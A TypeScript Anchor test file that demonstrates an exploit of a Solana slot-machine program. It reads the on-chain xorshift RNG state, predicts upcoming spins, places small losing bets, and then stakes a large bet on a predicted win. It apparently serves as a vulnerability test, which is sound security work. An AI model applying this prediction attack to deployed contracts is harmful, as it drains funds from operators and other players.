import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { expect } from "chai";
import {
  createMint,
  getOrCreateAssociatedTokenAccount,
  mintTo,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { Keypair, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
import BN from "bn.js";
import fs from "fs";
import path from "path";

type RngState = { x: number; y: number; z: number; w: number };

const WEIGHT_TOTAL = 10000;
const PAYOUT_BASE = 100;
const SYMBOL_DOUBLE = 5;

class XorshiftRngLocal {
  private x: number;
  private y: number;
  private z: number;
  private w: number;
  constructor(state: RngState) {
    this.x = state.x >>> 0;
    this.y = state.y >>> 0;
    this.z = state.z >>> 0;
    this.w = state.w >>> 0;
  }
  nextU32(): number {
    const t = (this.x ^ ((this.x << 11) >>> 0)) >>> 0;
    this.x = this.y;
    this.y = this.z;
    this.z = this.w;
    this.w = (this.w ^ (this.w >>> 19) ^ (t ^ (t >>> 8))) >>> 0;
    return this.w >>> 0;
  }
  nextRange(maxExclusive: number): number {
    return this.nextU32() % maxExclusive;
  }
}

function weightToSymbol(weights: number[], r: number): number {
  let cum = 0;
  for (let i = 0; i < weights.length; i++) {
    cum += weights[i];
    if (r < cum) return i;
  }
  return weights.length - 1;
}

function calculateOutcome(
  symbols: number[],
  payoutTriple: number[],
  payoutDouble: number[]
): { winningSymbol: number | null; payoutMultiplier: number } {
  const hasDouble = symbols.some((s) => s === SYMBOL_DOUBLE);
  if (hasDouble) {
    throw new Error("测试要求禁用 DOUBLE 符号以避免 auto-spin 干扰");
  }

  if (symbols[0] === symbols[1] && symbols[1] === symbols[2]) {
    const s = symbols[0];
    if (s === SYMBOL_DOUBLE) return { winningSymbol: null, payoutMultiplier: 0 };
    return { winningSymbol: s, payoutMultiplier: payoutTriple[s] ?? 0 };
  }

  const counts = [0, 0, 0, 0, 0, 0];
  for (const s of symbols) counts[s] += 1;
  const pairIdx = counts.findIndex((c, i) => i !== SYMBOL_DOUBLE && c >= 2);
  if (pairIdx >= 0) {
    return { winningSymbol: pairIdx, payoutMultiplier: payoutDouble[pairIdx] ?? 0 };
  }

  return { winningSymbol: null, payoutMultiplier: 0 };
}

function pickLosingBetSymbol(winningSymbol: number | null): number {
  if (winningSymbol === null) return 0;
  const nonDoubleCount = 5;
  return (winningSymbol + 1) % nonDoubleCount;
}

describe("predictability_exploit", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  let program: Program;
  const owner = provider.wallet;

  let gameState: PublicKey;
  let mint: PublicKey;
  let poolTokenAccount: PublicKey;

  const player = Keypair.generate();
  let playerTokenAccount: PublicKey;

  before(async () => {
    const idl = JSON.parse(
      fs.readFileSync(path.join(process.cwd(), "target/idl/slot_machine.json"), "utf8")
    );
    program = new Program(idl, provider);
  });

  before(async () => {
    [gameState] = PublicKey.findProgramAddressSync([Buffer.from("game_state")], program.programId);

    let gameStateAccount: any;
    try {
      gameStateAccount = await program.account.gameState.fetch(gameState);
    } catch {
      gameStateAccount = null;
    }

    if (gameStateAccount) {
      mint = gameStateAccount.poolMint as PublicKey;
      poolTokenAccount = gameStateAccount.poolTokenAccount as PublicKey;
    } else {
      mint = await createMint(provider.connection, owner.payer, owner.publicKey, null, 6);
      poolTokenAccount = (
        await getOrCreateAssociatedTokenAccount(provider.connection, owner.payer, mint, gameState, true)
      ).address;

      await program.methods
        .initialize()
        .accounts({
          gameState,
          user: owner.publicKey,
          tokenMint: mint,
          poolTokenAccount,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .rpc();
    }

    playerTokenAccount = (
      await getOrCreateAssociatedTokenAccount(provider.connection, owner.payer, mint, player.publicKey)
    ).address;

    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(player.publicKey, 2 * LAMPORTS_PER_SOL)
    );

    await mintTo(provider.connection, owner.payer, mint, playerTokenAccount, owner.publicKey, 10_000_000_000);
    await mintTo(provider.connection, owner.payer, mint, poolTokenAccount, owner.publicKey, 50_000_000_000);
  });

  it("单回合可预测验证：读取 RNG 预测未来某次中奖符号，并只对该符号下注，结果与预测一致", async () => {
    const weights = [2500, 2500, 250, 1600, 3150, 0];
    await program.methods.setSymbolWeights(weights).accounts({ gameState, owner: owner.publicKey }).rpc();

    const state0: any = await program.account.gameState.fetch(gameState);
    const rng0: RngState = {
      x: state0.rng.x as number,
      y: state0.rng.y as number,
      z: state0.rng.z as number,
      w: state0.rng.w as number,
    };
    const payoutTriple = (state0.payoutTriple as number[]).map((n) => Number(n));
    const payoutDouble = (state0.payoutDouble as number[]).map((n) => Number(n));

    const lookahead = 50;
    const rng = new XorshiftRngLocal(rng0);
    const predictions: Array<{
      symbols: number[];
      winningSymbol: number | null;
      payoutMultiplier: number;
    }> = [];

    for (let i = 0; i < lookahead; i++) {
      const symbols = [
        weightToSymbol(weights, rng.nextRange(WEIGHT_TOTAL)),
        weightToSymbol(weights, rng.nextRange(WEIGHT_TOTAL)),
        weightToSymbol(weights, rng.nextRange(WEIGHT_TOTAL)),
      ];
      const { winningSymbol, payoutMultiplier } = calculateOutcome(symbols, payoutTriple, payoutDouble);
      predictions.push({ symbols, winningSymbol, payoutMultiplier });
    }

    const targetIndex = predictions.findIndex((p) => p.winningSymbol !== null && p.payoutMultiplier > 0);
    expect(targetIndex).to.be.greaterThan(-1);

    const dummyBet = 1_000;
    const exploitBet = 1_000_000;

    const before = (await provider.connection.getTokenAccountBalance(playerTokenAccount)).value.amount;

    for (let i = 0; i < targetIndex; i++) {
      const p = predictions[i];
      const betSymbol = pickLosingBetSymbol(p.winningSymbol);
      const bets = [new BN(0), new BN(0), new BN(0), new BN(0), new BN(0), new BN(0)];
      bets[betSymbol] = new BN(dummyBet);
      await program.methods
        .play(bets, null)
        .accounts({
          gameState,
          player: player.publicKey,
          playerTokenAccount,
          poolTokenAccount,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([player])
        .rpc();
    }

    const target = predictions[targetIndex];
    expect(target.winningSymbol).to.not.equal(null);
    expect(target.winningSymbol).to.not.equal(SYMBOL_DOUBLE);

    const exploitBets = [new BN(0), new BN(0), new BN(0), new BN(0), new BN(0), new BN(0)];
    exploitBets[target.winningSymbol as number] = new BN(exploitBet);

    await program.methods
      .play(exploitBets, null)
      .accounts({
        gameState,
        player: player.publicKey,
        playerTokenAccount,
        poolTokenAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([player])
      .rpc();

    const after = (await provider.connection.getTokenAccountBalance(playerTokenAccount)).value.amount;
    const delta = BigInt(after) - BigInt(before);

    const payout = (BigInt(exploitBet) * BigInt(target.payoutMultiplier)) / BigInt(PAYOUT_BASE);
    const expected = -BigInt(dummyBet) * BigInt(targetIndex) - BigInt(exploitBet) + payout;

    expect(delta).to.equal(expected);
  });
});
